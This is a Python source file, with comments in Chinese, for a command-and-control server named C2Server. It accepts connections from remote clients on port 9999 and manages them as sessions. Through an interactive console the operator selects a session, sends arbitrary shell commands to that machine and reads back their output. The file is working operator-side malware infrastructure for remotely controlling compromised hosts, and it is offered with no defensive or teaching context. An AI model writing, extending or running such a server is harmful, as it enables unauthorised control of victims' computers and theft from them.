import socket
import threading
import os
import select
import logging
from SessionManager import SessionManager

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s: %(message)s'
)

class C2Server:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.sessions = SessionManager()
        self._setup_server()

    def _setup_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        logging.info(f"[*] C2 server listening on {self.host}:{self.port}")

    def _handle_client(self, conn, addr):
        session_id = self.sessions.add(conn, addr)
        logging.info(f"[*] Session {session_id} ({addr[0]}:{addr[1]}) connected")
        
        try:
            while True:
                ready, _, _ = select.select([conn], [], [], 30)
                if ready:
                    data = self._recv_all(conn)
                    if not data:
                        break
                    
                    # 处理客户端响应
                    decoded = data.decode('utf-8', errors='replace')
                    if decoded.startswith("CMD_RESULT:"):
                        output = decoded[len("CMD_RESULT:"):]
                        print(f"\n[Session {session_id}] 执行结果:\n{output}")
                    elif decoded == "HEARTBEAT":
                        conn.send(b"ALIVE")
        except Exception as e:
            logging.error(f"[!] Session {session_id} error: {str(e)}")
        finally:
            self.sessions.remove(session_id)
            conn.close()

    def _recv_all(self, sock, buffer_size=4096):
        """可靠数据接收方法"""
        data = b''
        while True:
            part = sock.recv(buffer_size)
            data += part
            if len(part) < buffer_size:
                break
        return data

    def start(self):
        command_thread = threading.Thread(target=self._command_handler)
        command_thread.daemon = True
        command_thread.start()

        while True:
            conn, addr = self.server.accept()
            client_thread = threading.Thread(
                target=self._handle_client, 
                args=(conn, addr)
            )
            client_thread.daemon = True
            client_thread.start()

    def _command_handler(self):
        """命令控制台"""
        while True:
            try:
                cmd = input("\nC2 > ").strip()
                if not cmd:
                    continue

                if cmd == "sessions":
                    self._list_sessions()
                elif cmd.startswith("select "):
                    self._handle_select(cmd)
                elif cmd == "exit":
                    os._exit(0)
                else:
                    self._send_command_to_client(cmd)
            except Exception as e:
                logging.error(f"命令处理错误: {str(e)}")

    def _list_sessions(self):
        """列出所有会话"""
        print("\n活跃会话:")
        for sid, (conn, addr) in self.sessions.active_sessions.items():
            print(f"  {sid} - {addr[0]}:{addr[1]}")

    def _handle_select(self, cmd):
        """处理会话选择"""
        try:
            session_id = int(cmd.split()[1])
            if self.sessions.select(session_id):
                print(f"[*] 已选择会话 {session_id}")
            else:
                print("[!] 无效会话ID")
        except:
            print("用法: select <会话ID>")

    def _send_command_to_client(self, cmd):
        """向客户端发送命令"""
        if not self.sessions.current_session:
            print("[!] 请先选择活动会话")
            return

        conn = self.sessions.get_current_connection()
        if not conn:
            print("[!] 会话连接已失效")
            return

        try:
            conn.sendall(f"REMOTE_CMD:{cmd}".encode('utf-8'))
            print(f"[*] 命令已发送至会话 {self.sessions.current_session}")
        except (BrokenPipeError, ConnectionResetError):
            print(f"[!] 连接已断开，会话 {self.sessions.current_session} 已移除")
            self.sessions.remove(self.sessions.current_session)

if __name__ == "__main__":
    server = C2Server()
    server.start()
